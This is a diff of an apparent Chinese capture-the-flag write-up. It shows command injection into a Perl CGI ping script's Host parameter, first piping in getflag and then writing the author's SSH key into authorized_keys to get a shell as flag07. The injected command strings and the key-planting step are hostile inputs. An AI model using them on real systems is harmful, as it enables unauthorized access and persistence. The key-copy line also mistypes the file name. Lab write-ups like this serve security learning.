@@ -69,7 +69,37 @@ ping(param("Host")); #从URL中解析出Host，并传入ping函数
 ~~~~{bash}
 wget http://127.0.0.1:7007/index.cgi?Host=www.baidu.com
 ~~~~
-得到 ![](http://hot.github.io/img/ScreenClip.png)
+
+
+得到
+
+
+![](http://hot.github.io/img/ScreenClip.png)
+
+成功ping了baidu.com
+
+###尝试命令行拼接：
+~~~~{bash}
+wget http://127.0.0.1:7007/index.cgi?Host='www.baidu.com && getflag' 
+#执行失败，没有执行到getflag
+#尝试使用|来代替&&
+wget http://127.0.0.1:7007/index.cgi?Host='www.baidu.com | getflag' 
+~~~~
+
+###成功执行了getflag！！
+
+##更进一步，获取shell：
+
+~~~~{bash}
+ssh-keygen -t rsa      #生成ssh的密钥
+cp ~/.ssh/id_rsa.pub /tmp/     #放到一个大家都可以访问的目录下面
+#将我们的公钥放到被信任的名单中
+wget http://127.0.0.1:7007/index.cgi?Host='www.baidu.com | mkdir .ssh|cp /tmp/id_ras.pub .ssh/authorized_keys'  
+
+ssh flag07@127.0.0.1  #尝试ssh登录
+~~~~
+
+成功得到shell~
 
 <!-- markdown end -->
 </div>
@@ -119,9 +149,38 @@ sub ping <span class="token punctuation">{</span>
 
 <h2 id="host">如何将Host传入进去呢：</h2>
 
-<p>赶紧掏出万能下载神器wget：
-</p><pre class=" language-bash"><code class=" language-bash">wget http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">7007</span><span class="token operator">/</span>index<span class="token punctuation">.</span>cgi<span class="token operator">?</span>Host<span class="token operator">=</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com
-</code></pre>得到 <img src="http://hot.github.io/img/ScreenClip.png" alt="" title=""><p></p>
+<p>赶紧掏出万能下载神器wget：</p>
+
+<pre class=" language-bash"><code class=" language-bash">wget http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">7007</span><span class="token operator">/</span>index<span class="token punctuation">.</span>cgi<span class="token operator">?</span>Host<span class="token operator">=</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com
+</code></pre>
+
+<p>得到</p>
+
+<p><img src="http://hot.github.io/img/ScreenClip.png" alt="" title=""></p>
+
+<p>成功ping了baidu.com</p>
+
+<h3 id="">尝试命令行拼接：</h3>
+
+<pre class=" language-bash"><code class=" language-bash">wget http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">7007</span><span class="token operator">/</span>index<span class="token punctuation">.</span>cgi<span class="token operator">?</span>Host<span class="token operator">=</span><span class="token string">'www.baidu.com &amp;&amp; getflag'</span> 
+<span class="token comment" spellcheck="true">#执行失败，没有执行到getflag
+</span><span class="token comment" spellcheck="true">#尝试使用|来代替&amp;&amp;
+</span>wget http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">7007</span><span class="token operator">/</span>index<span class="token punctuation">.</span>cgi<span class="token operator">?</span>Host<span class="token operator">=</span><span class="token string">'www.baidu.com | getflag'</span> 
+</code></pre>
+
+<h3 id="getflag">成功执行了getflag！！</h3>
+
+<h2 id="shell">更进一步，获取shell：</h2>
+
+<pre class=" language-bash"><code class=" language-bash">ssh<span class="token operator">-</span>keygen <span class="token operator">-</span>t rsa      <span class="token comment" spellcheck="true">#生成ssh的密钥
+</span>cp <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>id_rsa<span class="token punctuation">.</span>pub <span class="token operator">/</span>tmp<span class="token operator">/</span>     <span class="token comment" spellcheck="true">#放到一个大家都可以访问的目录下面
+</span><span class="token comment" spellcheck="true">#将我们的公钥放到被信任的名单中
+</span>wget http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">7007</span><span class="token operator">/</span>index<span class="token punctuation">.</span>cgi<span class="token operator">?</span>Host<span class="token operator">=</span><span class="token string">'www.baidu.com | mkdir .ssh|cp /tmp/id_ras.pub .ssh/authorized_keys'</span>  
+
+ssh flag07@<span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span>  <span class="token comment" spellcheck="true">#尝试ssh登录
+</span></code></pre>
+
+<p>成功得到shell~</p>
 <!-- content end -->
 </div>
 <br>
